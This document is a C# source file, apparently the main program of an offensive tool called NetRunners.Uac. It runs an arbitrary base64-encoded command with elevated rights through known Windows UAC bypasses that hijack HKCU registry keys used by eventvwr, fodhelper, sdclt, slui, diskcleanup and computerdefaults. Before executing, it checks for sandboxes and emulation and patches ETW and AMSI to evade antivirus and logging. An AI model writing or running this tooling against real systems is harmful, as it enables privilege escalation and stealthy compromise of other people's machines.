﻿using System;
using static NetRunners.Uac.Bypass.Bypass;
using static NetRunners.Heuristics.Heuristics;
using static NetRunners.Patchers.Patcher;

namespace NetRunners.Uac
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string bypass = null;
            byte[] encodedCommand = null;
            bool help = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-b":
                    case "--bypass":
                        if (++i < args.Length) bypass = args[i];
                        break;
                    case "-e":
                    case "--encodedCommand":
                        if (++i < args.Length) encodedCommand = Convert.FromBase64String(args[i]);
                        break;
                    case "-h":
                    case "-?":
                    case "--help":
                        help = true;
                        break;
                }
            }
            if (help || bypass == null) 
            {
                ShowHelp();
                Environment.Exit(1);
            }
            else if (encodedCommand == null)
            {
                Console.Write("Missing base64 encoded command to execute\n\n");
                ShowHelp();
                Environment.Exit(1);
            }
            else
            {
                // AV stuff
                if ((!Sleep()) || (!NonEmulated()))
                {
                    return;
                }
                // call patchers
                if ((!PatchEtw()) || (!PatchAmsi()))
                    return;
                // execute
                ExecuteBypass(bypass, encodedCommand);
            }
        }

        private static void ShowHelp()
        {
            Console.WriteLine("Usage: ");
            Console.WriteLine(" -b, --bypass             Bypass technique to execute: eventvwr, fodhelper,computerdefaults, sdclt, slui");
            Console.WriteLine(" -e, --encodedCommand     Base64 encoded command to execute");
            Console.WriteLine(" -h, -?, --help           Show this help");
        }

        private static void ExecuteBypass(string bypass, byte[] encodedCommand)
        {
            switch (bypass.ToLower())
            {
                case "eventvwr":
                    EventVwr(encodedCommand);               // modifies HKCU\Software\Classes\mscfile\Shell\Open\command (default value)
                    break;
                case "fodhelper":
                    FodHelper(encodedCommand);              // modifies HKCU\Software\Classes\ms-settings\Shell\Open\command (default value) (DelegateExecute, gets overwritten with empty value)
                    break;
                case "sdclt":
                    Sdclt(encodedCommand);                  // modifies HKCU\Software\Classes\ms-settings\Shell\Open\command (default value) (DelegateExecute, gets overwritten with empty value)
                    break;
                case "slui":
                    Slui(encodedCommand);                   // modifies HKCU\Software\Classes\Folder\shell\open\command (default value) (DelegateExecute, gets overwritten with empty value)
                    break;
                case "diskcleanup":
                    DiskCleanup(encodedCommand);            // modifies HKCU\Environment (windir value with command to execute)
                    break;
                case "computerdefaults":
                    ComputerDefaults(encodedCommand);       // modifies HKCU\Software\Classes\ms-settings\Shell\Open\command (default value) (DelegateExecute, gets overwritten with empty value)
                    break;
                default:
                    Console.WriteLine($"Invalid bypass option: {bypass}");
                    ShowHelp();
                    Environment.Exit(1);
                    break;
            }
        }
    }
}
